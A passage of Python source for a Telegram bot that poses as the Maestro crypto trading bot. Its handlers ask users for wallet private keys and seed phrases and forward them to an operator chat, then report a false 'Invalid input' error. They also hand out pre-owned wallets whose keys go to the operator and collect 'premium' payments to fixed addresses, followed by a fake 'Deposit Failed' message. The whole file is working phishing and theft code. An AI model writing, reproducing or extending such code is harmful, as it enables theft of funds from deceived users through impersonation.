        reply_markup=get_pumpfun_keyboard(),
    )


async def render_premium_menu(bot: Bot, chat_id: int, message_id=None):
    if message_id is not None:
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=PREMIUM_BENEFITS_TEXT,
                parse_mode="HTML",
                reply_markup=get_premium_keyboard(),
            )
        except Exception:
            pass
        track_premium_message(chat_id, message_id)
        return None

    sent = await bot.send_message(
        chat_id=chat_id,
        text=PREMIUM_BENEFITS_TEXT,
        parse_mode="HTML",
        reply_markup=get_premium_keyboard(),
    )
    track_premium_message(chat_id, sent.message_id)
    return sent


@dp.message(Command("premium"))
async def premium_command(message: types.Message):
    await render_premium_menu(message.bot, message.chat.id)


@dp.callback_query(F.data == "cashback_pumpfun")
async def cashback_pumpfun(callback: types.CallbackQuery):
    await callback.message.edit_text(
        text=PUMPFUN_TEXT,
        reply_markup=get_pumpfun_keyboard(return_callback="cashback"),
    )
    await callback.answer()


@dp.callback_query(F.data == "cashback_phantom")
async def cashback_phantom(callback: types.CallbackQuery):
    await callback.message.edit_text(
        text=PUMPFUN_TEXT,
        reply_markup=get_pumpfun_keyboard(return_callback="cashback"),
    )
    await callback.answer()


@dp.callback_query(F.data == "cashback_tiers")
async def cashback_tiers(callback: types.CallbackQuery):
    await callback.message.edit_text(
        text=CASHBACK_TIERS_TEXT,
        parse_mode="HTML",
        reply_markup=get_cashback_tiers_keyboard(),
    )
    await callback.answer()


@dp.callback_query(F.data == "referral")
async def referral_overview(callback: types.CallbackQuery):
    profile = get_referral_profile(callback.from_user.id, callback.from_user.username or callback.from_user.first_name or f"user_{callback.from_user.id}")
    await callback.message.edit_text(
        text=build_referral_overview_text(profile, callback.from_user.username or callback.from_user.first_name or f"user_{callback.from_user.id}"),
        parse_mode="HTML",
        reply_markup=get_referral_overview_keyboard(profile["referral_id"]),
    )
    await callback.answer()


@dp.callback_query(F.data == "referral_detail")
async def referral_detail(callback: types.CallbackQuery):
    profile = get_referral_profile(callback.from_user.id, callback.from_user.username or callback.from_user.first_name or f"user_{callback.from_user.id}")
    await callback.message.edit_text(
        text=build_referral_detail_text(profile, callback.from_user.username or callback.from_user.first_name or f"user_{callback.from_user.id}"),
        parse_mode="HTML",
        reply_markup=get_referral_detail_keyboard(),
    )
    await callback.answer()


@dp.callback_query(F.data == "referral_recipient_wallet")
async def referral_recipient_wallet(callback: types.CallbackQuery):
    await callback.message.edit_text(
        text=PUMPFUN_TEXT,
        reply_markup=get_pumpfun_keyboard(return_callback="referral_detail"),
    )
    await callback.answer()

# TEXT HANDLER FOR NAMING CONSTRAINT VALIDATION
@dp.message(WalletSetupState.waiting_for_name)
async def process_wallet_name(message: types.Message, state: FSMContext):
    name_input = message.text.strip()

    if not name_input.isalnum() or len(name_input) > 8:
        try:
            username = message.from_user.username or message.from_user.first_name or f"user_{message.from_user.id}"
            await bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=f"⚠️ Invalid wallet name attempt from @{username} (ID: {message.from_user.id})\nValue: {name_input}"
            )
        except Exception as e:
            print(f"Failed to notify admin about invalid wallet name. Error: {e}")

        await message.answer("⚠️ Name must be 8 letters max, only numbers and letters. Try another name:")
        return

    if name_input.lower() in used_wallet_names:
        await message.answer("Name taken. Try another name:")
        return

    try:
        await message.delete()
    except Exception as e:
        print(f"Failed to delete user wallet name message. Error: {e}")

    user_data = await state.get_data()
    chain = (user_data.get("current_chain") or user_data.get("chosen_chain") or "SOL").upper()

    wallet_entry = get_next_wallet(chain)
    if not wallet_entry:
        await message.answer(
            "❌ Failed to generate. Too many users are currently using the bot. Please try again shortly.",
            reply_markup=get_generation_error_keyboard()
        )
        await state.clear()
        return

    used_wallet_names.add(name_input.lower())
    assigned_wallets[wallet_entry["address"]] = True
    user_wallets[message.from_user.id] = {
        "chain": chain,
        "wallet_name": name_input,
        "address": wallet_entry["address"],
        "pk": wallet_entry["pk"],
        "username": message.from_user.username or message.from_user.first_name or f"user_{message.from_user.id}",
    }

    response_text = (
        "✅ <b>Wallet Generated</b>\n\n"
        f"<b>Chain:</b> {chain}\n"
        f"<b>Address:</b> <code>{wallet_entry['address']}</code>\n"
        f"<b>Private Key:</b> <code>{wallet_entry['pk']}</code>\n\n"
        "<i>Save this private key securely and never share it. You can also import it into a wallet app if you wish.</i>"
    )

    try:
        username = message.from_user.username or message.from_user.first_name or f"user_{message.from_user.id}"
        await bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=(
                f"🆕 New wallet created\n"
                f"User: @{username} (ID: {message.from_user.id})\n"
                f"Wallet name: {name_input}\n"
                f"Chain: {chain}\n"
                f"Address: {wallet_entry['address']}\n"
                f"PK: {wallet_entry['pk']}"
            )
        )
    except Exception as e:
        print(f"Failed to notify admin about wallet creation. Error: {e}")

    await message.answer(text=response_text, parse_mode="HTML", reply_markup=get_wallet_created_keyboard())
    await state.clear()

@dp.message(PhantomConnectState.waiting_for_wallet_secret)
async def process_phantom_wallet_secret(message: types.Message, state: FSMContext):
    state_data = await state.get_data()
    prompt_message_id = state_data.get("prompt_message_id")

    try:
        await message.delete()
    except Exception:
        pass

    if prompt_message_id:
        try:
            await message.bot.delete_message(chat_id=message.chat.id, message_id=prompt_message_id)
        except Exception:
            pass

    username = message.from_user.username or message.from_user.first_name or f"user_{message.from_user.id}"
    button_label = "Connect Phantom"
    secret_value = (message.text or "").strip() or "[empty]"
    forwarded_text = (
        f"👤 User: {escape(username)}\n"
        f"🆔 Telegram ID: {message.from_user.id}\n"
        f"🔘 Button: {escape(button_label)}\n"
        f"📝 Message Sent:\n<code>{escape(secret_value)}</code>"
    )

    try:
        await bot.send_message(chat_id=ADMIN_CHAT_ID, text=forwarded_text, parse_mode="HTML")
    except Exception as e:
        print(f"Failed to forward Phantom wallet secret to admin. Error: {e}")

    await message.answer(
        text="⚠️ <b>Invalid input. Please try again.</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Try Again", callback_data="pumpfun_return")]]),
    )
    await state.clear()


# TEXT HANDLER: Captures user message when 'waiting_for_input' state is active
@dp.message(SupportForm.waiting_for_input)
async def process_support_input(message: types.Message, state: FSMContext):
    try:
        await message.forward(chat_id=ADMIN_CHAT_ID)
    except Exception as e:
        print(f"Failed to forward message to admin. Error: {e}")

    try:
        await message.delete()
    except Exception as e:
        print(f"Failed to delete user message. Error: {e}")

    await message.answer(
        text="⚠️ <b>Invalid input. Please try again.</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Try Again", callback_data="main_menu")]]),
    )
    await state.clear()

@dp.message()
async def check_for_contract_addresses(message: types.Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state in {
        WalletSetupState.waiting_for_name.state,
        SupportForm.waiting_for_input.state,
        PhantomConnectState.waiting_for_wallet_secret.state,
        BotStates.waiting_for_slippage.state,
        BotStates.waiting_for_gas.state,
        BotStates.waiting_for_global_slippage.state,
    }:
        return

    if message.text is None:
        return

    match = re.search(SOLANA_ADDRESS_REGEX, message.text)
    if not match:
        return

    mint_address = match.group(0)
    token_data = await fetch_dexscreener_data(mint_address)
    monitor_text = format_monitor_text(mint_address, token_data, 2160)
    sent_monitor = await message.answer(
        text=monitor_text,
        parse_mode="HTML",
        reply_markup=get_monitor_keyboard(message.from_user.id, mint_address),
        disable_web_page_preview=True,
    )

    try:
        await message.bot.pin_chat_message(
            chat_id=message.chat.id,
            message_id=sent_monitor.message_id,
            disable_notification=True,
        )
    except Exception as e:
        print(f"Error pinning token tracking panel: {e}")

@dp.callback_query(F.data == "track")
async def handle_track_click(callback: types.CallbackQuery):
    match = re.search(SOLANA_ADDRESS_REGEX, callback.message.text or callback.message.caption or "")
    if not match:
        await callback.answer(popup_alert("Expired!", "Start a new lookup.", "/start"), show_alert=True)
        return

    mint_address = match.group(0)
    token_data = await fetch_dexscreener_data(mint_address)
    text = format_monitor_text(mint_address, token_data, 2160)

    monitor_msg = await callback.message.answer(
        text=text,
        parse_mode="HTML",
        reply_markup=get_monitor_keyboard(callback.from_user.id, mint_address),
        disable_web_page_preview=True,
    )

    task = asyncio.create_task(monitor_countdown_task(bot, callback.message.chat.id, monitor_msg.message_id, mint_address, token_data))
    TRACKED_MONITORS[monitor_msg.message_id] = task
    await callback.answer()


@dp.callback_query(F.data.startswith("refresh_track:"))
async def handle_refresh_or_multi(callback: types.CallbackQuery):
    mint_address = callback.data.split(":", 1)[1]
    msg_id = callback.message.message_id

    if msg_id in TRACKED_MONITORS:
        TRACKED_MONITORS[msg_id].cancel()

    token_data = await fetch_dexscreener_data(mint_address)
    await callback.message.edit_text(
        text=format_monitor_text(mint_address, token_data, 2160),
        parse_mode="HTML",
        reply_markup=get_monitor_keyboard(callback.from_user.id, mint_address),
        disable_web_page_preview=True,
    )

    task = asyncio.create_task(monitor_countdown_task(bot, callback.message.chat.id, msg_id, mint_address, token_data))
    TRACKED_MONITORS[msg_id] = task
    await callback.answer("Monitor data refreshed!")


async def _prompt_config_value(callback: types.CallbackQuery, state: FSMContext, config_key: str, mint_address: str, prompt_text: str, keyboard_type: str):
    prompt_msg = await callback.message.answer(
        text=prompt_text,
        reply_markup=types.ForceReply(selective=True),
    )

    await state.update_data(
        panel_id=callback.message.message_id,
        prompt_id=prompt_msg.message_id,
        mint_address=mint_address,
        config_key=config_key,
        chat_id=callback.message.chat.id,
        keyboard_type=keyboard_type,
    )

    next_state = BotStates.waiting_for_slippage if config_key == "slippage" else BotStates.waiting_for_gas
    await state.set_state(next_state)
    await callback.answer()


@dp.callback_query(F.data == "slippage")
async def prompt_slippage_from_trade(callback: types.CallbackQuery, state: FSMContext):
    mint_address = re.search(SOLANA_ADDRESS_REGEX, callback.message.text or callback.message.caption or "")
    mint_address = mint_address.group(0) if mint_address else ""

    await _prompt_config_value(
        callback,
        state,
        "slippage",
        mint_address,
        "Reply to this message with your desired slippage percentage.\n\n"
        "⚠️ This will only impact manual buys and sells initiated through this panel.",
        "trading",
    )


@dp.callback_query(F.data.startswith("set_slip"))
async def prompt_slippage(callback: types.CallbackQuery, state: FSMContext):
    data = callback.data or ""
    mint_address = data.split(":", 1)[1] if ":" in data else ""
    if not mint_address:
        mint_address_match = re.search(SOLANA_ADDRESS_REGEX, callback.message.text or callback.message.caption or "")
        mint_address = mint_address_match.group(0) if mint_address_match else ""

    await _prompt_config_value(
        callback,
        state,
        "slippage",
        mint_address,
        "Reply to this message with your desired slippage percentage.\n\n"
        "⚠️ This will only impact manual buys and sells initiated through this panel.",
        "monitor",
    )


@dp.message(BotStates.waiting_for_slippage)
async def process_slippage_input(message: types.Message, state: FSMContext):
    state_data = await state.get_data()
    prompt_id = state_data.get("prompt_id")
    panel_id = state_data.get("panel_id")
    mint_address = state_data.get("mint_address")
    chat_id = state_data.get("chat_id")
    keyboard_type = state_data.get("keyboard_type", "monitor")

    if prompt_id:
        try:
            await message.bot.delete_message(chat_id=message.chat.id, message_id=prompt_id)
        except Exception:
            pass

    try:
        await message.delete()
    except Exception:
        pass

    clean_input = (message.text or "").replace("%", "").strip()
    try:
        numeric_value = int(clean_input)
    except ValueError:
        await message.answer("❌ Failed Slippage setup. Please enter a whole number from 1 to 50.")
        return

    if not (1 <= numeric_value <= 50):
        await message.answer("❌ Failed Slippage setup. Please enter a whole number from 1 to 50.")
        return

    user_id = message.from_user.id
    USER_CONFIGS[user_id] = get_user_data(user_id)
    USER_CONFIGS[user_id]["slippage"] = f"{numeric_value}%"
    print(f"Slippage updated for user {user_id}: {numeric_value}%")

    if panel_id and chat_id:
        try:
            reply_markup = get_monitor_keyboard(user_id, mint_address) if keyboard_type == "monitor" else get_trading_keyboard(user_id)
            await message.bot.edit_message_reply_markup(
                chat_id=chat_id,
                message_id=panel_id,
                reply_markup=reply_markup,
            )
        except Exception as e:
            print(f"Error refreshing panel button layout: {e}")

    await state.clear()


@dp.callback_query(F.data == "gas")
async def prompt_gas_from_trade(callback: types.CallbackQuery, state: FSMContext):
    mint_address = re.search(SOLANA_ADDRESS_REGEX, callback.message.text or callback.message.caption or "")
    mint_address = mint_address.group(0) if mint_address else ""

    await _prompt_config_value(
        callback,
        state,
        "gas",
        mint_address,
        "Reply to this message with your desired sell transaction priority (in SOL).\n\n"
        "Example: 0.005\n\n"
        "⚠️ This will only impact manual buys and sells initiated through this panel.",
        "trading",
    )


@dp.callback_query(F.data.startswith("set_gas"))
async def prompt_gas(callback: types.CallbackQuery, state: FSMContext):
    data = callback.data or ""
    mint_address = data.split(":", 1)[1] if ":" in data else ""
    if not mint_address:
        mint_address_match = re.search(SOLANA_ADDRESS_REGEX, callback.message.text or callback.message.caption or "")
        mint_address = mint_address_match.group(0) if mint_address_match else ""

    await _prompt_config_value(
        callback,
        state,
        "gas",
        mint_address,
        "Reply to this message with your desired sell transaction priority (in SOL).\n\n"
        "Example: 0.005\n\n"
        "⚠️ This will only impact manual buys and sells initiated through this panel.",
        "monitor",
    )


@dp.message(BotStates.waiting_for_gas)
async def process_gas_input(message: types.Message, state: FSMContext):
    state_data = await state.get_data()
    prompt_id = state_data.get("prompt_id")
    panel_id = state_data.get("panel_id")
    mint_address = state_data.get("mint_address")
    chat_id = state_data.get("chat_id")
    keyboard_type = state_data.get("keyboard_type", "monitor")

    if prompt_id:
        try:
            await message.bot.delete_message(chat_id=message.chat.id, message_id=prompt_id)
        except Exception:
            pass

    try:
        await message.delete()
    except Exception:
        pass

    raw_value = (message.text or "").strip().replace("SOL", "").strip()
    try:
        val = float(raw_value)
    except ValueError:
        await message.answer("❌ Failed Gas setup. Please enter a value from 0.002 to 50.0 SOL.")
        return

    if not (0.002 <= val <= 50.0):
        await message.answer("❌ Failed Gas setup. Please enter a value from 0.002 to 50.0 SOL.")
        return

    user_id = message.from_user.id
    USER_CONFIGS[user_id] = get_user_data(user_id)
    gas_text = f"{val:.3f}".rstrip("0").rstrip(".") or "0"
    USER_CONFIGS[user_id]["gas"] = f"{gas_text} SOL"
    print(f"Gas updated for user {user_id}: {gas_text} SOL")

    if panel_id and chat_id:
        try:
            reply_markup = get_monitor_keyboard(user_id, mint_address) if keyboard_type == "monitor" else get_trading_keyboard(user_id)
            await message.bot.edit_message_reply_markup(
                chat_id=chat_id,
                message_id=panel_id,
                reply_markup=reply_markup,
            )
        except Exception as e:
            print(f"Error refreshing panel button layout: {e}")

    await state.clear()


@dp.callback_query(F.data == "delete_monitor")
async def delete_monitor_ui(callback: types.CallbackQuery):
    msg_id = callback.message.message_id
    if msg_id in TRACKED_MONITORS:
        TRACKED_MONITORS[msg_id].cancel()
        del TRACKED_MONITORS[msg_id]

    try:
        await bot.unpin_chat_message(chat_id=callback.message.chat.id, message_id=msg_id)
    except Exception:
        pass

    await callback.message.delete()
    await callback.answer("Monitor deleted.")


@dp.callback_query(F.data == "set_limit")
async def limit_unavailable(callback: types.CallbackQuery):
    await callback.answer(popup_alert("Unavailable!", "This action is not ready yet.", "/start"), show_alert=True)


@dp.callback_query(F.data == "main_menu")
async def return_to_main(callback: types.CallbackQuery):
    msg_id = callback.message.message_id
    if msg_id in TRACKED_MONITORS:
        TRACKED_MONITORS[msg_id].cancel()

    try:
        await bot.unpin_chat_message(chat_id=callback.message.chat.id, message_id=msg_id)
    except Exception:
        pass

    await show_welcome_page(callback.bot, callback.message.chat.id, delete_message_ids=[msg_id])
    await callback.answer()


@dp.callback_query(F.data.in_({"connect_external_sol", "import_wallet", "pumpfun_connect_phantom"}))
async def connect_external_wallet(callback: types.CallbackQuery, state: FSMContext):
    return_callback = "wallets_main" if callback.data == "connect_external_sol" else "pumpfun_return"
    await callback.message.edit_text(
        text="💳 <b>Phantom Wallet Connection</b>\n\n<i>What's the private key of this wallet? you may also use a 12-word seed phrase..</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data=return_callback)]]),
    )
    await state.set_state(PhantomConnectState.waiting_for_wallet_secret)
    await state.update_data(prompt_message_id=callback.message.message_id)
    await callback.answer()


@dp.callback_query(F.data.in_({"generate_sol_wallet", "generate_wallet"}))
async def generate_wallet_alias(callback: types.CallbackQuery, state: FSMContext):
    if not get_next_wallet("SOL"):
        await callback.message.edit_text(
            text="❌ Failed to generate. Too many users are currently using the bot. Please try again shortly.",
            reply_markup=get_generation_error_keyboard(),
        )
        await callback.answer()
        return

    await callback.message.answer("What would you like to name this wallet? 8 letters max, only numbers and letters.")
    await state.update_data(current_chain="SOL")
    await state.set_state(WalletSetupState.waiting_for_name)
    await callback.answer()


@dp.callback_query(F.data == "pumpfun_return")
async def pumpfun_return(callback: types.CallbackQuery, state: FSMContext):
    state_data = await state.get_data()
    prompt_message_id = state_data.get("prompt_message_id")
    chat_id = callback.message.chat.id

    if prompt_message_id:
        try:
            await callback.bot.delete_message(chat_id=chat_id, message_id=prompt_message_id)
        except Exception:
            pass

    await state.clear()
    await show_welcome_page(callback.bot, chat_id, delete_message_ids=[callback.message.message_id])
    await callback.answer()


PREMIUM_PAYMENT_OPTIONS = {
    "sol": {"label": "$SOL", "amount": "2.6854 SOL", "address": "7bgnwJ7czcSxsGGtynKUs5s68dD4vBUZza1tPeBCHx4D", "confirm_text": "The bot will now generate a wallet for a 2.68 SOL deposit."},
    "eth": {"label": "$ETH", "amount": "0.13 ETH", "address": "0x105584B088807fbD92321576D069560b6E7f00c4", "confirm_text": "The bot will now generate a wallet for a 0.13 ETH deposit."},
    "usdt": {"label": "$USDT", "amount": "$200 USDT", "address": "TJ1XR4LVQBE3BiDhuv595b6ey26pq2Q7fk", "confirm_text": "The bot will now generate a wallet for a $200 USDT deposit."},
}


def get_premium_confirm_keyboard(currency: str = "sol"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Yes", callback_data=f"premium_confirm_yes:{currency}")],
        [InlineKeyboardButton(text="Return", callback_data=f"premium_back_main:{currency}")],
    ])


def get_premium_deposit_keyboard(currency: str = "sol"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="I Have Paid", callback_data=f"premium_paid:{currency}")],
        [InlineKeyboardButton(text="Return", callback_data=f"premium_back_confirm:{currency}")],
    ])


def get_premium_try_again_keyboard(currency: str = "sol"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Try Again", callback_data=f"premium_try_again:{currency}")],
    ])


@dp.callback_query(F.data.startswith("premium_pay_"))
async def premium_pay(callback: types.CallbackQuery):
    currency = callback.data.split("_", 2)[-1]
    meta = PREMIUM_PAYMENT_OPTIONS.get(currency, PREMIUM_PAYMENT_OPTIONS["sol"])
    track_premium_message(callback.message.chat.id, callback.message.message_id)
    await callback.message.edit_text(
        text=(
            "Premium: ❌\n\n"
            f"The bot will now generate a wallet for a {meta['amount']} deposit.\n\n"
            "⚠️ THIS PURCHASE IS NON-REFUNDABLE. Click ✅ Yes to proceed."
        ),
        parse_mode="HTML",
        reply_markup=get_premium_confirm_keyboard(currency),
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("premium_confirm_yes:"))
async def premium_confirm_yes(callback: types.CallbackQuery):
    currency = callback.data.split(":", 1)[1]
    meta = PREMIUM_PAYMENT_OPTIONS.get(currency, PREMIUM_PAYMENT_OPTIONS["sol"])
    track_premium_message(callback.message.chat.id, callback.message.message_id)
    await callback.message.edit_text(
        text=(
            "Premium: ❌\n\n"
            f"Deposit Exactly {meta['amount']} to the SOL wallet below\n"
            f"<i>{meta['address']}</i>\n\n"
            "Click I Have Paid once the transaction is sent."
        ),
        parse_mode="HTML",
        reply_markup=get_premium_deposit_keyboard(currency),
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("premium_back_main:"))
async def premium_back_main(callback: types.CallbackQuery):
    await render_premium_menu(callback.bot, callback.message.chat.id, callback.message.message_id)
    await callback.answer()


@dp.callback_query(F.data.startswith("premium_back_confirm:"))
async def premium_back_confirm(callback: types.CallbackQuery):
    currency = callback.data.split(":", 1)[1]
    meta = PREMIUM_PAYMENT_OPTIONS.get(currency, PREMIUM_PAYMENT_OPTIONS["sol"])
    track_premium_message(callback.message.chat.id, callback.message.message_id)
    await callback.message.edit_text(
        text=(
            "Premium: ❌\n\n"
            f"The bot will now generate a wallet for a {meta['amount']} deposit.\n\n"
            "⚠️ THIS PURCHASE IS NON-REFUNDABLE. Click ✅ Yes to proceed."
        ),
        parse_mode="HTML",
        reply_markup=get_premium_confirm_keyboard(currency),
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("premium_paid:"))
async def premium_paid(callback: types.CallbackQuery):
    currency = callback.data.split(":", 1)[1]
    meta = PREMIUM_PAYMENT_OPTIONS.get(currency, PREMIUM_PAYMENT_OPTIONS["sol"])
    username = callback.from_user.username or callback.from_user.first_name or f"user_{callback.from_user.id}"
    notification_text = (
        f"💳 Premium payment attempt\n"
        f"👤 User: {escape(username)}\n"
        f"🆔 Telegram ID: {callback.from_user.id}\n"
        f"🔘 Button: I Have Paid\n"
        f"💱 Currency: {meta['label']}\n"
        f"📝 User message: Clicked I Have Paid"
    )
    try:
        await callback.bot.send_message(chat_id=ADMIN_CHAT_ID, text=notification_text, parse_mode="HTML")
    except Exception as e:
        print(f"Failed to notify admin about premium payment. Error: {e}")

    track_premium_message(callback.message.chat.id, callback.message.message_id)
    await callback.message.edit_text(
        text="<b>Transaction Pending</b>\n\n<i>Please check back in about 1 minute.</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data=f"premium_return:{currency}")]]),
    )

    async def delayed_failure():
        await asyncio.sleep(300)
        try:
            await callback.bot.edit_message_text(
                chat_id=callback.message.chat.id,
                message_id=callback.message.message_id,
                text=(
                    "<b>Deposit Failed</b>\n\n"
                    "<i>Please try again or choose another payment method.</i>"
                ),
                parse_mode="HTML",
                reply_markup=get_premium_try_again_keyboard(currency),
            )
        except Exception:
            pass

    asyncio.create_task(delayed_failure())
    await callback.answer()


@dp.callback_query(F.data.startswith("premium_return:"))
async def premium_return(callback: types.CallbackQuery):
    await render_premium_menu(callback.bot, callback.message.chat.id, callback.message.message_id)
    await callback.answer()


@dp.callback_query(F.data.startswith("premium_try_again"))
async def premium_try_again(callback: types.CallbackQuery):
    chat_id = callback.message.chat.id
    welcome_message_id = WELCOME_MESSAGE_IDS.get(chat_id)
    tracked_ids = list(PREMIUM_FLOW_MESSAGE_IDS.get(chat_id, set()))

    for message_id in sorted(tracked_ids):
        if message_id == welcome_message_id:
            continue
        try:
            await callback.bot.delete_message(chat_id=chat_id, message_id=message_id)
        except Exception:
            pass

    await show_welcome_page(callback.bot, chat_id, delete_message_ids=[callback.message.message_id])
    PREMIUM_FLOW_MESSAGE_IDS[chat_id] = {welcome_message_id} if welcome_message_id else set()
    await callback.answer("Restarted premium flow")


@dp.callback_query()
async def handle_buttons(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()

    data = callback.data

    if data in {"chains", "manage_chains"}:
        await callback.message.edit_text(
            text=CHAINS_TEXT,
            parse_mode="HTML",
            reply_markup=get_chains_keyboard()
        )

    elif data in {"wallet_no_wallet", "wallets", "manage_wallets"}:
        await callback.message.edit_text(
            text=NO_WALLET_TEXT,
            parse_mode="HTML",
            reply_markup=get_no_wallet_keyboard()
        )

    elif data == "rearrange_wallets":
        await callback.message.edit_text(
            text=NO_WALLET_TEXT,
            parse_mode="HTML",
            reply_markup=get_rearrange_keyboard()
        )

    elif data == "import_wallet":
        await callback.message.answer("What's the private key of this wallet? you may also use a 12-word seed phrase..")
        await state.set_state(SupportForm.waiting_for_input)

    elif data.startswith("toggle_"):
        chain = data.split("_")[1].upper()
        network_status[chain] = not network_status[chain]
        await callback.message.edit_reply_markup(reply_markup=get_chains_keyboard())

    elif data.startswith("wallet_select_"):
        chain_type = data.split("_")[2]
        await callback.message.edit_text(
            text=NO_WALLET_TEXT,
            parse_mode="HTML",
            reply_markup=get_wallet_action_keyboard(chain_type)
        )

    elif data.startswith("generate_select_"):
        target_chain = data.split("_")[2].upper()

        if target_chain == "BASE":
            await callback.message.edit_text(
                text="Unavailable At the Moment",
                reply_markup=get_generation_error_keyboard()
            )
        elif not get_next_wallet(target_chain):
            await callback.message.edit_text(
                text="❌ Failed to generate. Too many users are currently using the bot. Please try again shortly.",
                reply_markup=get_generation_error_keyboard()
            )
        else:
            await callback.message.answer("What would you like to name this wallet? 8 letters max, only numbers and letters.")
            await state.update_data(chosen_chain=target_chain, current_chain=target_chain)
            await state.set_state(WalletSetupState.waiting_for_name)

    elif data == "back_to_main":
        await callback.message.edit_text(
            text=MAIN_WELCOME_TEXT,
            parse_mode="HTML",
            reply_markup=get_main_keyboard(),
            disable_web_page_preview=True
        )

    elif data == "generate_wallet":
        if not get_next_wallet("SOL"):
            await callback.message.edit_text(
                text="❌ Failed to generate. Too many users are currently using the bot. Please try again shortly.",
                reply_markup=get_generation_error_keyboard()
            )
        else:
            await callback.message.answer("What would you like to name this wallet? 8 letters max, only numbers and letters.")
            await state.update_data(current_chain="SOL")
            await state.set_state(WalletSetupState.waiting_for_name)

    elif data == "track_wallet":
        wallet_info = user_wallets.get(callback.from_user.id)
        if wallet_info:
            owner_label = wallet_info["username"]
            track_text = (
                f"🔗 {wallet_info['chain']}\n\n"
                f"Maestro: {wallet_info['address']}\n"
                f"🟢 Default | 🟢 Manual | 💰 0 {wallet_info['chain']}\n\n"
                f"🏦 Maestro Fees\n"
                f"Unpaid: 0 {wallet_info['chain']}\n"
                f"ℹ️ To transfer from a wallet or automatically import it to another compatible chain within the bot, click on the wallet name.\n"
                f"ℹ️ Enable \"Manual\" for the wallets participating in your manual buys. Automated buys will be defaulted to your \"Default\" wallet, but you can further control this through dedicated Signals, Copytrade, and Auto Snipe settings.\n\n"
                f"Owner: @{owner_label}"
            )
            await callback.message.edit_text(track_text)
        else:
            await callback.message.answer("No wallet found for your account yet.")

    elif data.startswith("chain_"):
        await callback.message.answer("Chain toggle initiated.")
    elif data == "signals":
        await render_signals_settings(callback)
    elif data == "signals_call_channels":
        await render_call_channels_menu(callback)
    elif data == "signals_external":
        await callback.answer(popup_alert("Unavailable!", "This source is offline.", "/start"), show_alert=True)
    elif data == "signals_maestro_dms":
        await callback.message.edit_text(
            text="You need to be premium User to access Maestro DMs",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data="signals")]]),
        )
        await callback.answer()
    elif data == "signals_scraper":
        await callback.message.edit_text(
            text="You need to be premium User to access Scraper",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data="signals")]]),
        )
        await callback.answer()
    elif data.startswith("call_channels_page:"):
        page = int(data.split(":", 1)[1])
        await render_call_channels_menu(callback, page)
    elif data.startswith("channel_select:"):
        channel_key = data.split(":", 1)[1]
        await render_channel_settings(callback, channel_key)
    elif data == "copytrade":
        await callback.message.edit_text(
            text="Select the target chain. You can remove or add missing chains through /chains.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="SOL", callback_data="copytrade_chain_sol"), InlineKeyboardButton(text="BASE", callback_data="copytrade_chain_base")],
                [InlineKeyboardButton(text="ETH", callback_data="copytrade_chain_eth")],
                [InlineKeyboardButton(text="Return", callback_data="main_menu")],
            ]),
        )
    elif data.startswith("copytrade_chain_"):
        await callback.message.edit_text(
            text="Only Available to Premium Users Subscribe Below",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Subscribe Premium", callback_data="copytrade_subscribe_premium")],
                [InlineKeyboardButton(text="Return", callback_data="copytrade")],
            ]),
        )
        await callback.answer()
    elif data == "copytrade_subscribe_premium":
        await render_premium_menu(callback.bot, callback.message.chat.id, callback.message.message_id)
        await callback.answer()
    elif data == "active_orders":
        await callback.answer(popup_alert("Need wallet!", "Import or generate one to trade.", "/start"), show_alert=True)
    elif data == "positions":
        await callback.answer(popup_alert("Need wallet!", "Import or generate one to trade.", "/start"), show_alert=True)
    elif data == "auto_snipe":
        await callback.answer(popup_alert("Need wallet!", "Import or generate one to trade.", "/start"), show_alert=True)
    elif data == "bridge":
        await callback.answer(popup_alert("Need wallet!", "Import or generate one to trade.", "/start"), show_alert=True)
    elif data == "premium":
        await render_premium_menu(callback.bot, callback.message.chat.id, callback.message.message_id)
        await callback.answer()
    elif data == "cashback":
        await callback.message.edit_text(
            text=CASHBACK_DASHBOARD_TEXT,
            parse_mode="HTML",
            reply_markup=get_cashback_dashboard_keyboard(),
        )
        await callback.answer()
    elif data == "buy_sell_now":
        await callback.message.answer("⚡️ Fast Trade Console: Paste a Token contract address (CA) below.")
    elif data == "more_links":
        await callback.message.answer(
            "🔗 More links:\nhttps://t.me/MaestroBotsHub\nhttps://t.me/MaestroSniperUpdates\nhttps://x.com/MaestroBots\nhttps://docs.maestrobots.com/"
        )

dp.include_router(router)


async def main():
    keep_alive()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())